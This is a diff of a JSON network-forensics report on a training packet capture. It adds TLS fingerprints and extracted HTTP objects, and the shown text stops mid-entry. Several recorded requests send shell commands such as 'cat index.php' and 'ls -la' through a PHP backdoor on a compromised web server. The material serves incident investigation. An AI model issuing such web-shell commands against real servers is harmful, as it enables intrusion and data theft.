@@ -1,7 +1,7 @@
 {
   "schema_version": "0.2.0",
   "provenance": {
-    "tool_version": "0.4.0",
+    "tool_version": "0.6.0",
     "pcap_path": "C:\\Users\\a.grigoryev\\Downloads\\FIRST-2015_Hands-on_Network_Forensics_PCAP\\2015-03-12\\snort.log.1426118407",
     "pcap_sha256": "5272b725ba1276ab02b09e43180895e4cd2c0832caf2f5c1794cbff2abba5ab1"
   },
@@ -10,8 +10,12 @@
     "unique_dns_queries": 162,
     "nxdomain_count": 376,
     "flows": 11941,
-    "findings": 7,
+    "findings": 6,
     "extractor_errors": {},
+    "tcp_streams": 4701,
+    "tcp_streams_truncated": 4,
+    "http_objects": 203,
+    "carved_files": 0,
     "uploaded_bytes": 9355073,
     "downloaded_bytes": 21065108,
     "internal_bytes": 2933633,
@@ -253,7 +257,7 @@
           "zkygedkpyzdll.pwned.se"
         ],
         "findings_indices": [
-          4
+          2
         ],
         "service_flows_in": 0,
         "service_unique_srcs": [],
@@ -380,7 +384,7 @@
           "www.zend.com"
         ],
         "findings_indices": [
-          3
+          1
         ],
         "service_flows_in": 0,
         "service_unique_srcs": [],
@@ -860,72 +864,6 @@
       }
     ],
     "external": [
-      {
-        "ip": "212.219.56.184",
-        "is_internal": false,
-        "roles": [
-          "external",
-          "c2_candidate"
-        ],
-        "first_seen": 1426195689.59201,
-        "last_seen": 1426195689.753101,
-        "flows_out": 2,
-        "flows_in": 2,
-        "bytes_out": 1192,
-        "bytes_in": 958,
-        "unique_dsts": [
-          "192.168.0.2"
-        ],
-        "unique_srcs": [
-          "192.168.0.2"
-        ],
-        "sni_domains": [],
-        "dns_names": [],
-        "findings_indices": [
-          2
-        ],
-        "service_flows_in": 0,
-        "service_unique_srcs": [],
-        "mac": null,
-        "hostname": null,
-        "username": null,
-        "realm": null,
-        "asn": null,
-        "country": null
-      },
-      {
-        "ip": "194.105.226.20",
-        "is_internal": false,
-        "roles": [
-          "external",
-          "c2_candidate"
-        ],
-        "first_seen": 1426195689.981434,
-        "last_seen": 1426195690.171007,
-        "flows_out": 2,
-        "flows_in": 2,
-        "bytes_out": 1348,
-        "bytes_in": 778,
-        "unique_dsts": [
-          "192.168.0.2"
-        ],
-        "unique_srcs": [
-          "192.168.0.2"
-        ],
-        "sni_domains": [],
-        "dns_names": [],
-        "findings_indices": [
-          1
-        ],
-        "service_flows_in": 0,
-        "service_unique_srcs": [],
-        "mac": null,
-        "hostname": null,
-        "username": null,
-        "realm": null,
-        "asn": null,
-        "country": null
-      },
       {
         "ip": "216.58.209.101",
         "is_internal": false,
@@ -1496,6 +1434,70 @@
           "192.168.0.54"
         ],
         "sni_domains": [],
+        "dns_names": [],
+        "findings_indices": [],
+        "service_flows_in": 0,
+        "service_unique_srcs": [],
+        "mac": null,
+        "hostname": null,
+        "username": null,
+        "realm": null,
+        "asn": null,
+        "country": null
+      },
+      {
+        "ip": "173.194.66.103",
+        "is_internal": false,
+        "roles": [
+          "external"
+        ],
+        "first_seen": 1426131001.548676,
+        "last_seen": 1426152843.547138,
+        "flows_out": 81,
+        "flows_in": 81,
+        "bytes_out": 139744,
+        "bytes_in": 223450,
+        "unique_dsts": [
+          "192.168.0.54"
+        ],
+        "unique_srcs": [
+          "192.168.0.54"
+        ],
+        "sni_domains": [
+          "www.google.com"
+        ],
+        "dns_names": [],
+        "findings_indices": [],
+        "service_flows_in": 0,
+        "service_unique_srcs": [],
+        "mac": null,
+        "hostname": null,
+        "username": null,
+        "realm": null,
+        "asn": null,
+        "country": null
+      },
+      {
+        "ip": "74.125.195.105",
+        "is_internal": false,
+        "roles": [
+          "external"
+        ],
+        "first_seen": 1426174804.376264,
+        "last_seen": 1426196646.027198,
+        "flows_out": 90,
+        "flows_in": 90,
+        "bytes_out": 135350,
+        "bytes_in": 225828,
+        "unique_dsts": [
+          "192.168.0.54"
+        ],
+        "unique_srcs": [
+          "192.168.0.54"
+        ],
+        "sni_domains": [
+          "www.google.com"
+        ],
         "dns_names": [],
         "findings_indices": [],
         "service_flows_in": 0,
@@ -2091,7 +2093,8 @@
         "duration": 73785.328527,
         "first_ts": 1426131000.874566,
         "last_ts": 1426204786.203093,
-        "sni": "mtalk.google.com"
+        "sni": "mtalk.google.com",
+        "ja3": "e03fdb6b99211ce6d1ed8a21abf4b25b"
       },
       {
         "proto": "tcp",
@@ -2118,7 +2121,8 @@
         "duration": 427.881999,
         "first_ts": 1426131001.194046,
         "last_ts": 1426131429.076045,
-        "sni": "mail.google.com"
+        "sni": "mail.google.com",
+        "ja3": "0a7d2a1f4e376ba050fdcc5fd6b59021"
       },
       {
         "proto": "tcp",
@@ -2225,7 +2229,8 @@
         "duration": 7.189335,
         "first_ts": 1426121903.975887,
         "last_ts": 1426121911.165222,
-        "sni": "compatexchange.trafficmanager.net"
+        "sni": "compatexchange.trafficmanager.net",
+        "ja3": "1d095e68489d3c535297cd8dffb06cb9"
       },
       {
         "proto": "udp",
@@ -2334,7 +2339,8 @@
         "duration": 68636.145178,
         "first_ts": 1426126749.093684,
         "last_ts": 1426195385.238862,
-        "sni": "imap.gmail.com"
+        "sni": "imap.gmail.com",
+        "ja3": "1d095e68489d3c535297cd8dffb06cb9"
       },
       {
         "proto": "tcp",
@@ -2348,7 +2354,8 @@
         "duration": 5.394551,
         "first_ts": 1426121929.614034,
         "last_ts": 1426121935.008585,
-        "sni": "watson2.microsoft.com"
+        "sni": "watson2.microsoft.com",
+        "ja3": "1d095e68489d3c535297cd8dffb06cb9"
       },
       {
         "proto": "tcp",
@@ -2562,7 +2569,8 @@
         "duration": 73785.328527,
         "first_ts": 1426131000.874566,
         "last_ts": 1426204786.203093,
-        "sni": "mtalk.google.com"
+        "sni": "mtalk.google.com",
+        "ja3": "e03fdb6b99211ce6d1ed8a21abf4b25b"
       },
       {
         "proto": "tcp",
@@ -2603,7 +2611,8 @@
         "duration": 427.881999,
         "first_ts": 1426131001.194046,
         "last_ts": 1426131429.076045,
-        "sni": "mail.google.com"
+        "sni": "mail.google.com",
+        "ja3": "0a7d2a1f4e376ba050fdcc5fd6b59021"
       },
       {
         "proto": "tcp",
@@ -2687,7 +2696,8 @@
         "duration": 68636.145178,
         "first_ts": 1426126749.093684,
         "last_ts": 1426195385.238862,
-        "sni": "imap.gmail.com"
+        "sni": "imap.gmail.com",
+        "ja3": "1d095e68489d3c535297cd8dffb06cb9"
       },
       {
         "proto": "tcp",
@@ -2715,7 +2725,8 @@
         "duration": 245.734809,
         "first_ts": 1426188605.357119,
         "last_ts": 1426188851.091928,
-        "sni": "mail.google.com"
+        "sni": "mail.google.com",
+        "ja3": "bfa1674e65282fa3b5444623156e83bd"
       },
       {
         "proto": "tcp",
@@ -2729,7 +2740,8 @@
         "duration": 245.570871,
         "first_ts": 1426181404.958623,
         "last_ts": 1426181650.529494,
-        "sni": "mail.google.com"
+        "sni": "mail.google.com",
+        "ja3": "bfa1674e65282fa3b5444623156e83bd"
       },
       {
         "proto": "tcp",
@@ -2795,7 +2807,8 @@
         "duration": 240.312012,
         "first_ts": 1426131001.193309,
         "last_ts": 1426131241.505321,
-        "sni": "clients2.googleusercontent.com"
+        "sni": "clients2.googleusercontent.com",
+        "ja3": "6062f6c7c72e5cf557cc9698f4f31fce"
       },
       {
         "proto": "tcp",
@@ -3780,6 +3793,815 @@
       }
     ]
   },
+  "http_objects": {
+    "total": 203,
+    "objects": [
+      {
+        "src_ip": "217.195.49.146",
+        "dst_ip": "192.168.0.2",
+        "src_port": 63129,
+        "dst_port": 54769,
+        "kind": "response",
+        "method": null,
+        "uri": "/fr.jpg",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "image/jpeg",
+        "body_size": 168962,
+        "truncated": false,
+        "body_preview": "ffd8ffe000104a4649460001010100b400b40000ffe20c584943435f50524f46494c4500010100000c484c696e6f021000006d6e74725247422058595a2007ce"
+      },
+      {
+        "src_ip": "216.58.209.138",
+        "dst_ip": "192.168.0.51",
+        "src_port": 80,
+        "dst_port": 37415,
+        "kind": "response",
+        "method": null,
+        "uri": "/ajax/libs/jquery/1.10.2/jquery.min.js",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/javascript; charset=UTF-8",
+        "body_size": 32822,
+        "truncated": false,
+        "body_preview": "1f8b08000000000002ffccbdf97bdbc6b530fc7bff0a11f555007344914ed2b70533e275bc3469b338b1d3a4a5683f10094a88418001402d11d8bffd3bcb6c58"
+      },
+      {
+        "src_ip": "72.52.91.14",
+        "dst_ip": "192.168.0.51",
+        "src_port": 80,
+        "dst_port": 51625,
+        "kind": "response",
+        "method": null,
+        "uri": "/manual/en/function.fopen.php",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=utf-8",
+        "body_size": 31125,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003ec3d6b73db36b69faf7f0556ddc963d69292f49dd8ee3acfe66ed3e4c6ee7677b61d0f4442126b8a6001d2b23af7c7dff3004052a264"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54290,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/data/skins/techjunkie/images/header.gif",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "image/gif",
+        "body_size": 16829,
+        "truncated": false,
+        "body_preview": "4749463839619803cd00f700001a6da9196da83787bc1c6faadad0c4196ca83888bd1b6eaa1368a52f80b71a6ea9186ca7186ca81b6faa3484ba3686bb2e7fb6"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54320,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/data/skins/techjunkie/images/header.gif",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "image/gif",
+        "body_size": 16829,
+        "truncated": false,
+        "body_preview": "4749463839619803cd00f700001a6da9196da83787bc1c6faadad0c4196ca83888bd1b6eaa1368a52f80b71a6ea9186ca7186ca81b6faa3484ba3686bb2e7fb6"
+      },
+      {
+        "src_ip": "91.189.95.36",
+        "dst_ip": "192.168.0.51",
+        "src_port": 80,
+        "dst_port": 59063,
+        "kind": "response",
+        "method": null,
+        "uri": "/meta-release",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/plain; charset=utf-8",
+        "body_size": 10510,
+        "truncated": false,
+        "body_preview": "446973743a2077617274790a4e616d653a2057617274792057617274686f670a56657273696f6e3a2030342e31300a446174653a205765642c203230204f6374"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54357,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/FrogSquad.jpg",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "image/jpeg",
+        "body_size": 8192,
+        "truncated": false,
+        "body_preview": "ffd8ffe000104a4649460001010100b400b40000ffe20c584943435f50524f46494c4500010100000c484c696e6f021000006d6e74725247422058595a2007ce"
+      },
+      {
+        "src_ip": "72.52.91.14",
+        "dst_ip": "192.168.0.51",
+        "src_port": 80,
+        "dst_port": 51632,
+        "kind": "response",
+        "method": null,
+        "uri": "/cached.php?t=1421837618&f=/js/common.js",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "application/javascript",
+        "body_size": 7994,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003ec3d6b73db48729fa35f31a6790620812029d9bbb794619f9f675decb5b3b2d79b50dcad2131246181000f00f55889f959f901f965e9"
+      },
+      {
+        "src_ip": "72.52.91.14",
+        "dst_ip": "192.168.0.51",
+        "src_port": 80,
+        "dst_port": 51629,
+        "kind": "response",
+        "method": null,
+        "uri": "/cached.php?t=1423002604&f=/styles/theme-base.css",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/css;charset=UTF-8",
+        "body_size": 7762,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003bc3d6b93dbc6919fc35f31d93d972585804072b9abe59e55766c294e9593b822e752758ecf050243121108c000b8abb58abfecbedd2f"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54401,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html;charset=ISO-8859-1",
+        "body_size": 7011,
+        "truncated": false,
+        "body_preview": "3c21444f43545950452048544d4c205055424c494320222d2f2f5733432f2f4454442048544d4c20332e322046696e616c2f2f454e223e0a3c68746d6c3e0a20"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 58554,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 5426,
+        "truncated": false,
+        "body_preview": "3c21444f43545950452068746d6c205055424c494320222d2f2f5733432f2f445444205848544d4c20312e30205374726963742f2f454e22200d0a2020202022"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 35426,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 5426,
+        "truncated": false,
+        "body_preview": "3c21444f43545950452068746d6c205055424c494320222d2f2f5733432f2f445444205848544d4c20312e30205374726963742f2f454e22200d0a2020202022"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54006,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 5426,
+        "truncated": false,
+        "body_preview": "3c21444f43545950452068746d6c205055424c494320222d2f2f5733432f2f445444205848544d4c20312e30205374726963742f2f454e22200d0a2020202022"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 44446,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 5426,
+        "truncated": false,
+        "body_preview": "3c21444f43545950452068746d6c205055424c494320222d2f2f5733432f2f445444205848544d4c20312e30205374726963742f2f454e22200d0a2020202022"
+      },
+      {
+        "src_ip": "72.52.91.14",
+        "dst_ip": "192.168.0.51",
+        "src_port": 80,
+        "dst_port": 51631,
+        "kind": "response",
+        "method": null,
+        "uri": "/cached.php?t=1421837618&f=/js/search.js",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "application/javascript",
+        "body_size": 4764,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003ad5b6f93dbb6d17fef4f81683c91eea2e3c5495e3c23fb2e75ecb4751bd769ecb62f3c9e0c4442127c144103e0e934ee7df7677701f0"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54291,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/data/skins/techjunkie/images/nav.gif",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "image/gif",
+        "body_size": 3868,
+        "truncated": false,
+        "body_preview": "47494638396198033200d50000dad0c4d5cbbfd3cabed7cdc1d2c8bccfc6bad9cfc3d8cec2d0c7bcc4bbb0f6f0e8bab2a7beb5abbfb7acf0eae3e8e3dcc2baaf"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54321,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/data/skins/techjunkie/images/nav.gif",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "image/gif",
+        "body_size": 3868,
+        "truncated": false,
+        "body_preview": "47494638396198033200d50000dad0c4d5cbbfd3cabed7cdc1d2c8bccfc6bad9cfc3d8cec2d0c7bcc4bbb0f6f0e8bab2a7beb5abbfb7acf0eae3e8e3dcc2baaf"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54337,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/cm0.php?cmd=cat%20index.php",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 3334,
+        "truncated": false,
+        "body_preview": "3c212d2d2053696d706c6520504850206261636b646f6f7220627920444b2028687474703a2f2f6d69636861656c6461772e6f726729202d2d3e0a0a3c707265"
+      },
+      {
+        "src_ip": "72.52.91.14",
+        "dst_ip": "192.168.0.51",
+        "src_port": 80,
+        "dst_port": 51630,
+        "kind": "response",
+        "method": null,
+        "uri": "/cached.php?t=1423251602&f=/styles/theme-medium.css",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/css;charset=UTF-8",
+        "body_size": 2415,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003cd196b6fe3b8f1f3fa57b0498b4bf62c457e5eace00a5c1207f76171b7b8bd430b1445414b94454412bd24e5c49be6bf77484ab228d1"
+      },
+      {
+        "src_ip": "72.52.91.14",
+        "dst_ip": "192.168.0.51",
+        "src_port": 80,
+        "dst_port": 51627,
+        "kind": "response",
+        "method": null,
+        "uri": "/cached.php?t=1421837618&f=/js/ext/mousetrap.min.js",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "application/javascript",
+        "body_size": 2004,
+        "truncated": false,
+        "body_preview": "1f8b080000000000000385576997dbb615fd3ebf42425a99b0108e383376227260c51e2b89133bf169dc9e9e23ab2d48824b878b4c52b358547f7beee3226a3c"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54382,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/cm0.php?cmd=ls%20-la",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1834,
+        "truncated": false,
+        "body_preview": "3c212d2d2053696d706c6520504850206261636b646f6f7220627920444b2028687474703a2f2f6d69636861656c6461772e6f726729202d2d3e0a0a3c707265"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54385,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/cm0.php?cmd=ls%20-la",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1834,
+        "truncated": false,
+        "body_preview": "3c212d2d2053696d706c6520504850206261636b646f6f7220627920444b2028687474703a2f2f6d69636861656c6461772e6f726729202d2d3e0a0a3c707265"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54380,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/cm0.php?cmd=ls%20-l",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1701,
+        "truncated": false,
+        "body_preview": "3c212d2d2053696d706c6520504850206261636b646f6f7220627920444b2028687474703a2f2f6d69636861656c6461772e6f726729202d2d3e0a0a3c707265"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54370,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/cm0.php?cmd=ls%20-lrt",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1701,
+        "truncated": false,
+        "body_preview": "3c212d2d2053696d706c6520504850206261636b646f6f7220627920444b2028687474703a2f2f6d69636861656c6461772e6f726729202d2d3e0a0a3c707265"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54302,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1596,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003d4586d6fdb3610fe9c00fb0f577dd89745569c17f4cd569138c9da214983da45570c434049178b0d456a2265c7fd47fb1bfb653b5272"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54311,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1595,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003d4586d6fdb3610fe9c00fb0f577dd89745569c17f4cd569138c9da214983da45570c434049178b0d456a2265c7fd47fb1bfb653b5272"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54314,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1589,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003d4586d6fdb3610fe9c00fb0f577dd89745561c27e89bad227192b5439206b58bae188680922e161b8ad4442a8efb8ff637f6cb76a4e4"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54295,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1588,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003d4586d6fdb3610fe9c00fd0f577dd89745569c97f5cd569138c9da214983da45170c434049178b0d456a2215c7fd47fb1bfb653b5272"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54296,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1588,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003d4586d6fdb3610fe9c00fd0f577dd89745569c97f5cd569138c9da214983da45170c434049178b0d456a2215c7fd47fb1bfb653b5272"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54298,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1588,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003d4586d4fdc3810fe0c52ffc3341feecb910dcb8b4adbdd54b0c0b527a0a8bb55af3a9d90930c1b17c74e638765fb8fee6fdc2fbbb193"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54304,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1588,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003d4586d4fdc3810fe0c52ffc3341feecb910dcb8b4adbdd54b0c0b527a0a8bb55af3a9d90930c1b17c74e638765fb8fee6fdc2fbbb193"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54312,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1588,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003d4586d6fdb3610fe9c00fd0f577dd89745569c97beda2a1227593b246950bbe88a610828e962b1a14955a4e2b8ff687f63bf6c474a4e"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54324,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/data/skins/techjunkie/images/footer-bottom.gif",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "image/gif",
+        "body_size": 1559,
+        "truncated": false,
+        "body_preview": "47494638396198032800d50000ede6dbf0e8ddece5dae6ded5ebe3d8e8e0d6e9e1d6e6ded4e5ddd3eee9e3eee8e1e7dfd6fcfaf9f9f8f6fcfbfafdfdfcf6f3f0"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54293,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=4",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1530,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003d4586d6fdb3610fe1c03fb0f577dd89745569c17346d6d15a993ac1d9234a85d74c530049474b1d850a4265271dc7fb4bfb15fb62325"
+      },
+      {
+        "src_ip": "72.52.91.14",
+        "dst_ip": "192.168.0.51",
+        "src_port": 80,
+        "dst_port": 51633,
+        "kind": "response",
+        "method": null,
+        "uri": "/images/logo.php",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "image/png",
+        "body_size": 1406,
+        "truncated": false,
+        "body_preview": "89504e470d0a1a0a0000000d4948445200000060000000300806000000ee167fcf0000000473424954080808087c086488000000097048597300000dd700000d"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54319,
+        "kind": "response",
+        "method": null,
+        "uri": "/skyblue/index.php?pid=7",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 1196,
+        "truncated": false,
+        "body_preview": "1f8b0800000000000003c457e16edb3610fedd007d87abfece12e334c3da4dd6d0bacd5a2c6983dac5360cfb414b678b0b456a2415457ba3bdc69e6c474a6e64"
+      },
+      {
+        "src_ip": "72.52.91.14",
+        "dst_ip": "192.168.0.51",
+        "src_port": 80,
+        "dst_port": 51628,
+        "kind": "response",
+        "method": null,
+        "uri": "/favicon.ico",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "image/vnd.microsoft.icon",
+        "body_size": 822,
+        "truncated": false,
+        "body_preview": "424d360300000000000036000000280000001000000010000000010018000000000000030000c40e0000c40e00000000000000000000c08080c08080c08080c0"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54288,
+        "kind": "response",
+        "method": null,
+        "uri": "/",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 790,
+        "truncated": false,
+        "body_preview": "3c6d65746120687474702d65717569763d22726566726573682220636f6e74656e743d22303b2075726c3d2f736b79626c75652f22202f3e0a3c68746d6c3e0a"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54318,
+        "kind": "response",
+        "method": null,
+        "uri": "/",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 790,
+        "truncated": false,
+        "body_preview": "3c6d65746120687474702d65717569763d22726566726573682220636f6e74656e743d22303b2075726c3d2f736b79626c75652f22202f3e0a3c68746d6c3e0a"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "182.118.53.67",
+        "src_port": 80,
+        "dst_port": 42117,
+        "kind": "response",
+        "method": null,
+        "uri": "/",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 790,
+        "truncated": false,
+        "body_preview": "3c6d65746120687474702d65717569763d22726566726573682220636f6e74656e743d22303b2075726c3d2f736b79626c75652f22202f3e0a3c68746d6c3e0a"
+      },
+      {
+        "src_ip": "192.168.0.2",
+        "dst_ip": "217.195.49.146",
+        "src_port": 80,
+        "dst_port": 54399,
+        "kind": "response",
+        "method": null,
+        "uri": "/index.html",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/html; charset=UTF-8",
+        "body_size": 790,
+        "truncated": false,
+        "body_preview": "3c6d65746120687474702d65717569763d22726566726573682220636f6e74656e743d22303b2075726c3d2f736b79626c75652f22202f3e0a3c68746d6c3e0a"
+      },
+      {
+        "src_ip": "88.150.173.218",
+        "dst_ip": "192.168.0.2",
+        "src_port": 80,
+        "dst_port": 49073,
+        "kind": "response",
+        "method": null,
+        "uri": "/?release=7&arch=x86_64&repo=updates&infra=stock",
+        "status_code": 200,
+        "host": null,
+        "user_agent": null,
+        "content_type": "text/plain; charset=ISO-8859-1",
+        "body_size": 579,
+        "truncated": false,
